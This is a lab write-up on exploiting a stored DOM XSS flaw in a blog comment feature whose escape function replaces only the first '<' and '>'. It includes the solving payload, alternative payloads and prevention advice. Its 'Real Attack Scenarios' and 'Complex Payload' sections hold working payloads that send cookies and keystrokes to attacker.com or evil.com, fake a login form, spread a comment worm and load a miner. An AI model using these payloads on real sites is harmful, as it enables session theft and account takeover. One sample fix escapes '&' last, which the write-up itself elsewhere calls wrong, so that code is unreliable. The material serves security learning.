# Stored DOM XSS

## Lab Overview
**Difficulty:** Practitioner  
**Vulnerability Type:** Stored DOM XSS  
**Context:** Blog comment functionality with vulnerable HTML escape function  
**Objective:** Call `alert()` function via stored comment  
**Status:** ✅ Solved

---

## What is Stored DOM XSS?

Stored DOM XSS combines characteristics of both **Stored XSS** and **DOM-based XSS**:

1. **Stored:** Malicious payload is saved to the database
2. **DOM-based:** Client-side JavaScript processes the stored data unsafely
3. **Vulnerable sink:** JavaScript uses a flawed function to render the data

### Attack Flow
```
Submit Comment → Saved to Database → JavaScript loads it → Flawed escape function → XSS executes
```

---

## The Vulnerability

### The Comment Loading Code
```html
<span id='user-comments'>
    <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
    <script>loadComments('/post/comment')</script>
</span>
```

### Key Indicator
The filename **`loadCommentsWithVulnerableEscapeHtml.js`** reveals the vulnerability:
- Contains a **vulnerable HTML escape function**
- The escape function has a critical flaw

### The Vulnerable Pattern

The JavaScript likely contains code similar to:

```javascript
function escapeHTML(html) {
    // VULNERABLE: Only replaces FIRST occurrence!
    return html.replace('<', '&lt;').replace('>', '&gt;');
}

function loadComments(endpoint) {
    fetch(endpoint)
        .then(response => response.json())
        .then(comments => {
            comments.forEach(comment => {
                // Uses vulnerable escape function
                const escaped = escapeHTML(comment.body);
                document.getElementById('user-comments').innerHTML += escaped;
            });
        });
}
```

### The Flaw Explained

**Problem:** JavaScript's `.replace()` method without the **global flag** (`/g`) only replaces the **first match**!

```javascript
// Wrong - only replaces first occurrence
"<><img>".replace('<', '&lt;')  // Result: "&lt;><img>"
"<><img>".replace('>', '&gt;')  // Result: "&lt;&gt;<img>"

// Correct - replaces all occurrences  
"<><img>".replace(/</g, '&lt;')  // Result: "&lt;&gt;&lt;img&gt;"
"<><img>".replace(/>/g, '&gt;')  // Result: "&lt;&gt;&lt;img&gt;"
```

---

## The Solution

### Working Payload
In the **Comment** field:
```html
<><img src=x onerror=alert(1)>
```

### Complete Form Values

**Comment:**
```html
<><img src=x onerror=alert(1)>
```

**Name:**
```
test
```

**Email:**
```
test@test.com
```

**Website:**
```
https://test.com
```

### How It Works

**Step 1: Submit the payload**
```html
<><img src=x onerror=alert(1)>
```

**Step 2: Saved to database**
The comment is stored exactly as entered.

**Step 3: JavaScript loads and processes it**
```javascript
var comment = "<><img src=x onerror=alert(1)>";
var escaped = escapeHTML(comment);
```

**Step 4: Vulnerable escape function processes it**
```javascript
// First replace - only affects FIRST <
"<><img src=x onerror=alert(1)>".replace('<', '&lt;')
// Result: "&lt;><img src=x onerror=alert(1)>"

// Second replace - only affects FIRST >
"&lt;><img src=x onerror=alert(1)>".replace('>', '&gt;')
// Result: "&lt;&gt;<img src=x onerror=alert(1)>"
```

**Step 5: Inserted into DOM**
```html
&lt;&gt;<img src=x onerror=alert(1)>
```

**Step 6: Browser renders it**
- `&lt;&gt;` → Displayed as text: `<>`
- `<img src=x onerror=alert(1)>` → **Parsed as HTML and executed!**

**Step 7: XSS executes**
- Browser tries to load image from invalid source `x`
- Loading fails
- `onerror` event handler fires
- `alert(1)` executes! 🎉

---

## Payload Breakdown

| Part | Purpose | Explanation |
|------|---------|-------------|
| `<>` | Decoy tags | Consumes the first `<` and `>` that get escaped |
| `<img` | Image tag | Valid HTML tag that supports event handlers |
| `src=x` | Invalid source | Triggers error when browser tries to load |
| `onerror=alert(1)` | Event handler | JavaScript executed when image fails to load |
| `>` | Close tag | Completes the img element |

### Why the Empty Tag (`<>`) is Critical

**Without empty tag:**
```html
<img src=x onerror=alert(1)>
```
**After escape:**
```html
&lt;img src=x onerror=alert(1)&gt;
```
**Result:** Displayed as text, no execution ❌

**With empty tag:**
```html
<><img src=x onerror=alert(1)>
```
**After escape:**
```html
&lt;&gt;<img src=x onerror=alert(1)>
```
**Result:** First tag escaped, second tag executes ✅

---

## Step-by-Step Exploitation

### Step 1: Navigate to Any Blog Post
Click on any blog post to access the comment section.

### Step 2: Fill Out the Comment Form
- **Comment:** `<><img src=x onerror=alert(1)>`
- **Name:** Any name (e.g., `test`)
- **Email:** Valid email format (e.g., `test@test.com`)
- **Website:** Valid URL or leave empty (e.g., `https://test.com`)

### Step 3: Submit the Comment
Click **"Post Comment"** button.

### Step 4: Page Reloads
The page automatically reloads to display the new comment.

### Step 5: JavaScript Loads Comments
The `loadCommentsWithVulnerableEscapeHtml.js` script:
1. Fetches comments from the server
2. Processes each comment through the vulnerable escape function
3. Inserts them into the DOM

### Step 6: XSS Executes Automatically
When your comment is rendered:
- The `<img>` tag is created in the DOM
- Browser attempts to load the image
- Loading fails (invalid source)
- `onerror` handler executes
- `alert(1)` pops up!

### Step 7: Lab Solved ✅
The lab status changes to "Solved".

---

## Alternative Payloads

### Using SVG
```html
<><svg onload=alert(1)>
```

### Using Multiple Decoy Tags
```html
<<img src=x onerror=alert(1)>
```

### Using Different Events
```html
<><img src=x onload=alert(1) onerror=alert(1)>
```

### Using Iframe
```html
<><iframe src=javascript:alert(1)>
```

### Using Body Tag
```html
<><body onload=alert(1)>
```

### Using Video Tag
```html
<><video src=x onerror=alert(1)>
```

### Using Audio Tag
```html
<><audio src=x onerror=alert(1)>
```

### Complex Payload
```html
<><img src=x onerror=fetch('//attacker.com?c='+document.cookie)>
```

---

## Understanding the Vulnerable Code

### How JavaScript Replace Works

**Without Global Flag:**
```javascript
let str = "Hello World Hello";
str.replace('Hello', 'Hi');  // "Hi World Hello" - only first match!
```

**With Global Flag:**
```javascript
let str = "Hello World Hello";
str.replace(/Hello/g, 'Hi');  // "Hi World Hi" - all matches!
```

### The Vulnerable Escape Function
```javascript
function escapeHTML(html) {
    // Only escapes first < and first >
    return html.replace('<', '&lt;').replace('>', '&gt;');
}

// Testing the vulnerability
escapeHTML("<><img>");
// Step 1: "<><img>".replace('<', '&lt;') → "&lt;><img>"
// Step 2: "&lt;><img>".replace('>', '&gt;') → "&lt;&gt;<img>"
// Result: "&lt;&gt;<img>" - second tag is NOT escaped!
```

### The Correct (Safe) Version
```javascript
function escapeHTML(html) {
    // Escapes ALL < and > characters
    return html
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}

// Or use a more robust approach
function escapeHTML(html) {
    const div = document.createElement('div');
    div.textContent = html;
    return div.innerHTML;
}

// Or use DOMPurify library
function escapeHTML(html) {
    return DOMPurify.sanitize(html);
}
```

---

## Why This is Stored DOM XSS

### Comparison with Other XSS Types

| Type | Storage | Processing | Execution |
|------|---------|------------|-----------|
| **Stored XSS** | Database | Server renders HTML | Browser parses HTML |
| **DOM XSS** | Not stored | JavaScript processes | JavaScript execution |
| **Stored DOM XSS** | Database | JavaScript processes | JavaScript execution |
| **Reflected XSS** | Not stored | Server reflects | Browser parses HTML |

### Our Lab
1. ✅ **Stored** - Comment saved to database
2. ✅ **DOM-based** - JavaScript reads and processes it
3. ✅ **Vulnerable sink** - Flawed `escapeHTML()` function
4. ✅ **Client-side** - All processing happens in browser

---

## Prevention Strategies

### For Developers

#### ❌ Vulnerable Code
```javascript
// WRONG: Only replaces first occurrence
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

#### ✅ Fix 1: Use Global Flag
```javascript
function escapeHTML(html) {
    return html
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/&/g, '&amp;');
}
```

#### ✅ Fix 2: Use textContent
```javascript
// Safest approach - treats everything as text
function displayComment(comment) {
    const div = document.createElement('div');
    div.textContent = comment;  // No HTML parsing!
    document.getElementById('comments').appendChild(div);
}
```

#### ✅ Fix 3: Use createElement
```javascript
function displayComment(comment) {
    const p = document.createElement('p');
    const text = document.createTextNode(comment);
    p.appendChild(text);
    document.getElementById('comments').appendChild(p);
}
```

#### ✅ Fix 4: Use DOMPurify Library
```javascript
function displayComment(comment) {
    const clean = DOMPurify.sanitize(comment);
    document.getElementById('comments').innerHTML += clean;
}
```

#### ✅ Fix 5: Content Security Policy
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### Key Security Principles

1. **Never trust user input** - Always sanitize and validate
2. **Use textContent over innerHTML** - Prevents HTML injection
3. **Use global regex for replacement** - Ensure all matches are replaced
4. **Validate on both client and server** - Defense in depth
5. **Use established libraries** - DOMPurify, js-xss, etc.
6. **Implement CSP** - Additional security layer

---

## Real-World Impact

### Severity: High to Critical

**Why Stored DOM XSS is Dangerous:**
1. **Affects all users** who view the page
2. **Persistent** - remains until manually removed
3. **Automatic execution** - no user interaction needed
4. **Trusted context** - appears on legitimate site

**Real Attack Scenarios:**

### 1. Session Hijacking
```html
<><img src=x onerror=fetch('//attacker.com/steal?c='+document.cookie)>
```

### 2. Credential Harvesting
```html
<><img src=x onerror="document.body.innerHTML='<h1>Session Expired</h1><form action=//evil.com><input name=user><input name=pass type=password><button>Login</button></form>'">
```

### 3. Keylogging
```html
<><img src=x onerror="document.onkeypress=e=>fetch('//evil.com/log?k='+e.key)">
```

### 4. Self-Propagating XSS Worm
```html
<><img src=x onerror="fetch('/post/comment',{method:'POST',body:'comment='+encodeURIComponent(document.body.innerHTML)})">
```

### 5. Cryptocurrency Mining
```html
<><img src=x onerror="var s=document.createElement('script');s.src='//evil.com/miner.js';document.body.appendChild(s)">
```

---

## Detection Techniques

### For Security Testers

**1. Identify Comment/Input Functions**
- Look for user-generated content areas
- Forums, comments, reviews, profiles
- Any persistent data storage

**2. Check JavaScript Processing**
```javascript
// In browser DevTools, search for:
- innerHTML usage
- Custom escape/sanitize functions
- DOM manipulation of user input
```

**3. Test for Incomplete Escaping**
```html
<!-- Test payloads -->
<>test
<<test
<test<test
><test
```

**4. Monitor Network Responses**
- Check if input is stored as-is
- Verify server-side encoding
- Look for JSON responses with user data

**5. Use Automation Tools**
- Burp Suite Scanner
- OWASP ZAP
- Custom scripts to test replace() flaws

---

## Testing Methodology

### Step 1: Reconnaissance
Identify all user input points that:
- Store data persistently
- Display to other users
- Use JavaScript for rendering

### Step 2: Analyze JavaScript
```bash
# View all JavaScript files
# Look for custom escape functions
# Check for innerHTML usage
# Search for replace() without global flag
```

### Step 3: Test Basic XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

### Step 4: Test Escape Bypass
```html
<>test
<><script>alert(1)</script>
<><img src=x onerror=alert(1)>
<<img src=x onerror=alert(1)>
```

### Step 5: Verify Persistence
- Reload the page
- View from different account
- Check if payload remains

### Step 6: Confirm Execution
- Verify alert appears
- Check console for errors
- Test in multiple browsers

---

## Common Regex Replace Mistakes

### Mistake 1: No Global Flag
```javascript
// WRONG
str.replace('<', '&lt;')  // Only first match

// RIGHT
str.replace(/</g, '&lt;')  // All matches
```

### Mistake 2: Incomplete Character Set
```javascript
// WRONG - Only handles < and >
str.replace(/</g, '&lt;').replace(/>/g, '&gt;')

// RIGHT - Handles all dangerous characters
str.replace(/[&<>"']/g, char => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
}[char]))
```

### Mistake 3: Wrong Order
```javascript
// WRONG - & should be first
str.replace(/</g, '&lt;').replace(/&/g, '&amp;')

// RIGHT - Escape & first to avoid double-encoding
str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
```

---

## Key Takeaways

✅ **Stored DOM XSS** - Combines stored persistence with DOM-based processing  
✅ **Vulnerable escape functions** - `.replace()` without `/g` flag only replaces first match  
✅ **Decoy technique** - Use `<>` to consume the first escaped characters  
✅ **Automatic execution** - Affects all users who view the page  
✅ **Prevention** - Always use global regex or better yet, `textContent`  
✅ **Critical flaw** - Simple coding mistake leads to severe vulnerability  

---

## References

- [PortSwigger: DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [OWASP: DOM Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [MDN: String.prototype.replace()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace)
- [DOMPurify: XSS Sanitizer](https://github.com/cure53/DOMPurify)

---

**Date Completed:** February 2, 2026  
**Working Payload:** `<><img src=x onerror=alert(1)>`  
**Key Technique:** Bypassing incomplete HTML escape function by using decoy empty tags to consume first-match-only replacements
